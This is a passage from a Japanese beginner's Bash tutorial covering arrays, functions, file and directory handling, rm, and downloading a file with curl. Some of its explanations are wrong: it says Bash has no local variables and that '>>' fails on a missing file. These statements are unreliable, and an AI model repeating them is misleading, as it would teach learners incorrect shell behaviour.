&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[2]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash array2.sh
BMW TOYOTA HONDA
printing value using index
BMW
TOYOTA
HONDA
$
&lt;/code>&lt;/pre>&lt;p>配列のインデックスを印刷することもできます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:array3.sh" data-lang="bash:array3.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">car&lt;/span>&lt;span class="o">=(&lt;/span>&lt;span class="s1">&amp;#39;BMW&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;TOYOTA&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;HONDA&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;printing the indexes&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="p">!car[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash array3.sh
BMW TOYOTA HONDA
printing the indexes
0 1 2
$
&lt;/code>&lt;/pre>&lt;p>配列内の値の合計数を印刷する場合は、ここに「${#car[@]}」と書くだけで、要素の総数を表します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:array4.sh" data-lang="bash:array4.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">car&lt;/span>&lt;span class="o">=(&lt;/span>&lt;span class="s1">&amp;#39;BMW&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;TOYOTA&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;HONDA&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;ROVER&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;printing the indexes&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="p">!car[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;printing number of values&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${#&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash array4.sh
BMW TOYOTA HONDA ROVER
printing the indexes
0 1 2 3
printing number of values
4
$
&lt;/code>&lt;/pre>&lt;p>配列内にある任意の要素を削除したいとします。&lt;br>
要素を削除するには、配列名と削除する要素のインデックスを含む「unset」コマンドを使用します。&lt;br>
「car」配列の2番目のインデックスに格納されている値を削除する場合は、スクリプトに「unset car[2]」と書くだけです。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:array4.sh" data-lang="bash:array4.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">car&lt;/span>&lt;span class="o">=(&lt;/span>&lt;span class="s1">&amp;#39;BMW&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;TOYOTA&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;HONDA&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;ROVER&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>
&lt;span class="nb">unset&lt;/span> car&lt;span class="o">[&lt;/span>2&lt;span class="o">]&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;printing the indexes&amp;#34;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="p">!car[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;printing number of values&amp;#34;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${#&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>次のコードを「helloScript.sh」に保存します。「./helloScript.sh」を使用してファイルを実行します。&lt;/p>
&lt;p>配列要素を削除することはわかりました。&lt;br>
では「MERCEDES」などの他の値をインデックス2に格納する場合はどうしましょう。&lt;br>
unsetコマンドを使用した後、次の行に「car[2]=&amp;lsquo;MERCEDES」と書きます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:array5.sh" data-lang="bash:array5.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">car&lt;/span>&lt;span class="o">=(&lt;/span>&lt;span class="s1">&amp;#39;BMW&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;TOYOTA&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;HONDA&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;ROVER&amp;#39;&lt;/span>&lt;span class="o">)&lt;/span>
&lt;span class="c1"># 2のHONDAを削除&lt;/span>
&lt;span class="nb">unset&lt;/span> car&lt;span class="o">[&lt;/span>2&lt;span class="o">]&lt;/span>
&lt;span class="c1"># 2に値をセット&lt;/span>
car&lt;span class="o">[&lt;/span>2&lt;span class="o">]=&lt;/span>&lt;span class="s1">&amp;#39;MERCEDES&amp;#39;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;printing the indexes&amp;#34;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${&lt;/span>&lt;span class="p">!car[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;printing number of values&amp;#34;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">${#&lt;/span>&lt;span class="nv">car&lt;/span>&lt;span class="p">[@]&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash array5.sh
BMW TOYOTA MERCEDES ROVER
printing the indexes
0 1 2 3
printing number of values
4
$
&lt;/code>&lt;/pre>&lt;h2 id="関数">関数&lt;/h2>
&lt;p>関数は基本的に再利用可能なコード行です。何度も呼び出すことができます。&lt;br>
特定の操作を何度も実行する場合、または特定の処理を何度も実行する場合、関数は、何度も何度も同じコードを書くための時間と労力を軽減します。&lt;/p>
&lt;p>以下は関数の構文を示す例です。&lt;br>
覚えておくべき最も重要なことの1つは、関数を呼び出す前にコーディングのどこかで最初に関数を定義または宣言する必要があることです。&lt;/p>
&lt;p>コードで関数を定義するには、３つのステップが必要です。&lt;br>
ステップ1は、指定する関数名の前に「function」コマンドを書き関数名を宣言し、後ろに「()」を書きます。&lt;br>
ステップ2は、処理ブロックは「{」ではじまり、「 }」で閉じられた内側ににコードを書くことです。&lt;br>
ステップ3は、function 関数名() で宣言した下の行で実行したい関数名を使用して関数を呼び出すことです。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:method.sh" data-lang="bash:method.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="c1"># 関数の宣言&lt;/span>
&lt;span class="k">function&lt;/span> funcName&lt;span class="o">(){&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;this is new function&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="c1"># 関数呼び出し&lt;/span>
funcName&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash method.sh
this is new function
$
&lt;/code>&lt;/pre>&lt;p>関数にパラメータを与えることもできます。&lt;br>
たとえば、関数呼び出し時に与えられる任意の単語を引数として指定します。&lt;br>
関数呼び出しの関数名の後ろに、文字列を指定して関数に渡します。&lt;br>
渡された関数は、一つ目のパラメータを $1 として処理を続ける事ができます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:method2.sh" data-lang="bash:method2.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">function&lt;/span> funcPrint&lt;span class="o">(){&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">}&lt;/span>
funcPrint &lt;span class="s2">&amp;#34;BashScript&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash method2.sh
BashScript
$
&lt;/code>&lt;/pre>&lt;p>複数のパラメータを扱う場合、$1, $2などの変数名は区別がつきにくく、コードが混乱する場合が多いので、変数に代入すると、扱いやすくなります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:method2.sh" data-lang="bash:method2.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">function&lt;/span> funcPrint&lt;span class="o">(){&lt;/span>
&lt;span class="nv">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nv">age&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$2&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$name&lt;/span>&lt;span class="s2"> is &lt;/span>&lt;span class="nv">$age&lt;/span>&lt;span class="s2"> years old.&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="o">}&lt;/span>
funcPrint &lt;span class="s2">&amp;#34;BashScript&amp;#34;&lt;/span> &lt;span class="m">24&lt;/span> &lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash method2.sh
BashScript is 24 years old.
$
関数内で宣言される変数はローカル変数です。
というのは一般的なプログラム言語ですが、シェルスクリプトBashはグローバル変数しかありません。関数の中で宣言しても、関数の外で宣言しても、いずれもグローバル変数です。
先に紹介した declare -g を使うことにより、グローバル変数とローカル変数を明確に区別することができます。
例えば、以下のソースでは、関数実行前に「I love Mac」を変数に格納し、出力します。
その後、関数を呼び出し、同変数に「I love Linux」を変数に代入すると、Ｃ言語やＪａｖａなどは、ローカル変数に格納した値は、グローバル変数に影響しない訳ですが、シェルスクリプトBashは、もろに影響します。理由は全てグローバル扱いだからです。
``` bash:global_local.sh
#!/bin/bash
function funcCheck(){
returningValue=&amp;quot;I love Linux&amp;quot;;
}
returningValue=&amp;quot;I love MAC&amp;quot;;
echo $returningValue;
#&amp;gt; I love Mac
funcCheck;
echo $returningValue;
#&amp;gt; I love Linux
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>$ bash global_local.sh
I love MAC
I love Linux
$
&lt;/code>&lt;/pre>&lt;h2 id="ファイルとディレクトリ">ファイルとディレクトリ&lt;/h2>
&lt;p>このトピックでは、&lt;br>
１．ファイルとディレクトリを作成する方法、&lt;br>
２．スクリプトを使用してこれらのファイルとディレクトリの存在を確認する方法、&lt;br>
３．ファイルからテキストを1行ずつ読み取る方法、&lt;br>
４．ファイルにテキストを追加する方法、&lt;br>
５．ファイルを削除する方法、&lt;/p>
&lt;p>を紹介します。&lt;/p>
&lt;h3 id="ディレクトリ操作">ディレクトリ操作&lt;/h3>
&lt;p>最初のスクリプトは、「Directory2」という名前のディレクトリを作成します。&lt;br>
&amp;lsquo;mkdir&amp;rsquo; コマンドでディレクトリを作成します。&lt;br>
すでに同じディレクトリに「Directory2」フォルダーがある場合はエラーとなります。&lt;br>
エラーに対処するためには、'-p&amp;rsquo; オプションを使います。&lt;br>
&amp;lsquo;-p&amp;rsquo; オプションは、作成しようとするその場所に、作成したいディレクトリ名が既に存在している場合は、なにもしません。ディレクトリが存在しない場合のみ、新しいディレクトリを作成します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:mkdir.sh" data-lang="bash:mkdir.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
mkdir -p Directory2
&lt;/code>&lt;/pre>&lt;/div>&lt;p>現在の場所にディレクトリが存在するかどうかをif文で確認することもできます。&lt;br>
「if」ステートメントでディレクトリが存在するかどうかをチェックするためにはif文の条件式で「-d」フラグを使用します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:mkdir-p.sh" data-lang="bash:mkdir-p.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;enter directory name to check&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> direct&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -d &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$direct&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$direct&lt;/span>&lt;span class="s2"> exists&amp;#34;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$direct&lt;/span>&lt;span class="s2"> doesn&amp;#39;t exist&amp;#34;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ファイル操作">ファイル操作&lt;/h3>
&lt;p>ファイルの作成には「touch」コマンドを使います。&lt;/p>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>ディレクトリの作成には &amp;lsquo;mkdir&amp;rsquo; コマンド、&lt;/dd>
&lt;dd>ファイルの作成には &amp;lsquo;touch&amp;rsquo; コマンドを使います。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:touch.sh" data-lang="bash:touch.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;enter file name to create&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> fileName&lt;span class="p">;&lt;/span>
touch &lt;span class="nv">$fileName&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>touchコマンドはmkdirコマンド同様、ファイルを作成しようとするその場所に、既に作成しようとするファイル明度同名のファイルが存在した場合、何もしません。&lt;/p>
&lt;p>mkdir は、ディレクトリを作成する。同名のディレクトリがあればエラーとなります。&lt;/p>
&lt;pre tabindex="0">&lt;code>ls
directory2/
$ mkdir directory2
mkdir: directory2: File exists
$
&lt;/code>&lt;/pre>&lt;p>そこで、mkdir -p コマンドは、同名のディレクトリが既にあればエラーを返さず何もしない。なければディレクトリを作成。&lt;br>
touchコマンドも同様で、同名のファイルが既にあればエラーを返さず何もせず、なければファイルを作成します。&lt;/p>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>touchコマンドは既に同名のファイルがあれば、エラーを返さない代わりに何もしませんが、「:&amp;gt;」コマンドでファイルを作成した場合、既に作成しようとするその場所に同名のファイルがあった場合、空の新規ファイルで上書きします。（ですので、ファイルは強制的に作成されますが、データ内容は消滅します。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;p>if文で -d フラグでディレクトリの存在を確認する事ができました。&lt;br>
ファイルも同様に -f フラグでファイルの存在を確認する事ができます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:checkFile.sh" data-lang="bash:checkFile.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;enter file name to check&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> fileName&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2"> exists&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2"> doesn&amp;#39;t exist&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="テキストへのファイル出力">テキストへのファイル出力&lt;/h3>
&lt;p>ファイルにテキストを追加するには、「&amp;gt;」リダイレクト、または「&amp;raquo;」アペンドを使います。&lt;br>
「&amp;gt;」リダイレクトは、ファイルを新規に作成し直してから出力します。&lt;br>
「&amp;raquo;」アペンドは、既にファイルが存在しているときに限定して出力します。&lt;/p>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>「&amp;gt;」リダイレクトは、既にファイルが存在している場合も、ファイルを新規作成します。ですので、元々あったファイルの内容は空になります。からになってもらっては困ると言う場合は、「touch」コマンドを使います。&lt;/dd>
&lt;dd>
&lt;p>また、「&amp;raquo;」アペンドは、追記する場合に、ファイルがない場合はエラーとなります。こうした事にならないように、次の例文で、ファイルの存在を確認して処理を進めます。&lt;/p>
&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:appendFile.sh" data-lang="bash:appendFile.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;入力ファイル名を指定して下さい&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> fileName&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ファイルに追記したい文字列を入力して下さい&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> fileText&lt;span class="p">;&lt;/span>
&lt;span class="c1"># ファイルがあれば&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="c1"># アペンド&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;アペンドします&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileText&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &amp;gt;&amp;gt; &lt;span class="nv">$fileName&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="c1"># リダイレクト&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;リダイレクトします&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileText&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &amp;gt; &lt;span class="nv">$fileName&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ファイルの読み込み">ファイルの読み込み&lt;/h3>
&lt;p>スクリプトを使用して任意のファイルを読み取ることもできます。上記の方法に従ってファイルを見つけます。その後、while条件を使用して「read -r line」を使用してファイルを読み取る。ファイルを読み取るので、このシンボル「&amp;lt;」を使用します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:whileRead.sh" data-lang="bash:whileRead.sh">&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;読み込みたいファイル名を指定して下さい&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> fileName&lt;span class="p">;&lt;/span>
&lt;span class="c1"># ファイルがあれば&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="c1"># 読み込む&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="nb">read&lt;/span> line&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$line&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>&amp;lt;&lt;span class="nv">$fileName&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2"> は存在しません&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ファイルを削除するには、まずファイルが存在するかどうかを調べることです。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:rm.sh" data-lang="bash:rm.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;enter file name from which you want to delete&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> fileName&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
rm &lt;span class="nv">$fileName&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2"> doesn&amp;#39;t exist&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>rmコマンドは非常に危険なコマンドです。&lt;/dd>
&lt;dd>ファイルの削除の都度確認を促す -i オプションをつけるなどをするとよいでしょう。&lt;/dd>
&lt;dd>rmコマンドは、ファイルだけではなくディレクトリも削除できます。&lt;/dd>
&lt;dd>再帰的に行いたい場合は、-r オプションをつけると良いです。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="curlコマンド">curlコマンド&lt;/h2>
&lt;p>カールは、URL構文を持つデータファイルを取得、または送信するためのコマンドです。&lt;br>
まず最初にしなければならないことはcurlをインストールすることです。&lt;/p>
&lt;pre tabindex="0">&lt;code># 確認
which curl
/usr/bin/curl
$
&lt;/code>&lt;/pre>&lt;p>ない場合、&lt;/p>
&lt;pre tabindex="0">&lt;code># macの場合
$ sudo brew install curl
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code># linuxの場合
$ yum install curl
&lt;/code>&lt;/pre>&lt;p>curlをインストールした後、URLを使ってファイルをダウンロードするためのコードを記述します。&lt;br>
curlを使用してデータファイルをダウンロードするには２つのステップが必要です。&lt;/p>
&lt;p>１つ目は、そのファイルの完全なリンクアドレスを持つことです。&lt;br>
２つ目は、そのアドレスをスクリプトの「url」変数に保存し、そのURLでcurlコマンドを使用してダウンロードすることです。ここで「-O」は、ダウンロードするファイル名は、実在のファイル名を継承すると言う意味となります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:curl.sh" data-lang="bash:curl.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">url&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://www.ovh.net/files/1Mb.dat&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
curl &lt;span class="si">${&lt;/span>&lt;span class="nv">url&lt;/span>&lt;span class="si">}&lt;/span> -O&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ダウンロードしたファイルに新しい名前を与えるには、「-o」オプションでファイル名を指定します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:curl2.sh" data-lang="bash:curl2.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">url&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://www.ovh.net/files/1Mb.dat&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
curl &lt;span class="si">${&lt;/span>&lt;span class="nv">url&lt;/span>&lt;span class="si">}&lt;/span> -o NewFileDownload&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>数百ギガバイトのサイズのファイルをダウンロードしたい場合はどうでしょう。&lt;br>
適切なファイルをダウンロードしているかどうかを確認するためにヘッダーファイルをダウンロードすることができます。&lt;br>
ファイルのURLの前に「-I」と書くだけです。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:curl3.sh" data-lang="bash:curl3.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
